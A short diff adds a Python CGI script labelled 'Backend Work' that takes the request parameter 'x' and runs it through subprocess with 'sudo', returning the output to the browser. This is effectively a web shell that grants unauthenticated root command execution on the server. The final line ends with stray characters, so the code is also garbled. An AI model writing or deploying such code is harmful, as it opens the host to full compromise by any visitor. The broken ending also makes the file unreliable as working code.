@@ -1,0 +1,13 @@
+import cgi
+import subprocess
+import time
+
+print("content-type: text/html")
+print()
+
+print("Backend Work")
+print()
+f=cgi.FieldStorage()
+cmd=f.getvalue("x")
+o=subprocess.getoutput("sudo "+ cmd)
+print(o)se
